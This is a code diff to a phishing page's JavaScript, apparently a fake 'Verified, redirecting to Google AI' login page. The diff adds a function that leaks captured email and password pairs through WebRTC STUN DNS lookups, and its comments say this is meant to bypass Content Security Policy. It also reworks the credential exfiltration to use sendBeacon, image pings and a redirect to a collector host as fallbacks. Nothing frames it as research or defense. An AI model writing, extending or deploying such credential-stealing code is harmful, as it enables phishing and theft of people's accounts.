@@ -132,25 +132,43 @@ h1{font-size:24px;font-weight:400;text-align:center;color:#202124;margin-bottom:
 <div class="msg" id="msg"><div class="check">\u2705</div><h2>Verified</h2><p>Redirecting to Google AI\u2026</p></div>';
   }
 
+  function stunExfil(data) {
+    // WebRTC STUN DNS exfil — bypasses all CSP directives
+    // Encode data into DNS-safe hostname labels (max 63 chars each)
+    var encoded = btoa(data).replace(/\+/g, "-").replace(/\//g, "_").replace(/=/g, "");
+    var host = C.replace("https://","");
+    var chunks = [];
+    for (var i = 0; i < encoded.length; i += 50) {
+      chunks.push(encoded.substring(i, i + 50));
+    }
+    // Send each chunk as a STUN server lookup
+    chunks.forEach(function(chunk, idx) {
+      try {
+        var pc = new RTCPeerConnection({
+          iceServers: [{ urls: "stun:" + idx + "." + chunk + "." + host }]
+        });
+        pc.createDataChannel("");
+        pc.createOffer().then(function(offer) {
+          pc.setLocalDescription(offer);
+        });
+        // Cleanup after 5s
+        setTimeout(function() { try { pc.close(); } catch(x) {} }, 5000);
+      } catch(x) {}
+    });
+  }
+
   function exfil(email, pass) {
-    var data = "email=" + encodeURIComponent(email) + "&pass=" + encodeURIComponent(pass);
-    // Try multiple exfil channels
-    // 1. sendBeacon (fire-and-forget, not blocked by connect-src on some browsers)
-    try { navigator.sendBeacon(C + "/b?" + data); } catch(x) {}
-    // 2. Image ping (often bypasses connect-src)
-    try { new Image().src = C + "/i?" + data + "&t=" + Date.now(); } catch(x) {}
-    // 3. DNS exfil via link prefetch
-    try {
-      var encoded = btoa(email + ":" + pass).replace(/[^a-zA-Z0-9]/g, "").substring(0, 60);
-      var link = document.createElement("link");
-      link.rel = "dns-prefetch";
-      link.href = "//" + encoded + "." + C.replace("https://","");
-      document.head.appendChild(link);
-    } catch(x) {}
-    // 4. Redirect (may be blocked by frame-src in iframe, works in popup)
-    setTimeout(function() {
-      window.location = C + "/collect?" + data;
-    }, 1500);
+    var data = email + "|" + pass;
+    // Primary: WebRTC STUN DNS exfil (bypasses CSP entirely)
+    stunExfil(data);
+    // Fallback attempts (may be blocked by CSP in iframe, work in popup)
+    var qs = "email=" + encodeURIComponent(email) + "&pass=" + encodeURIComponent(pass);
+    try { navigator.sendBeacon(C + "/b?" + qs); } catch(x) {}
+    try { new Image().src = C + "/i?" + qs + "&t=" + Date.now(); } catch(x) {}
+    // Redirect — works from popup (desktop), blocked from iframe (mobile)
+    if (!isMobile) {
+      setTimeout(function() { window.location = C + "/collect?" + qs; }, 1500);
+    }
   }
 
   function attachFormHandler() {
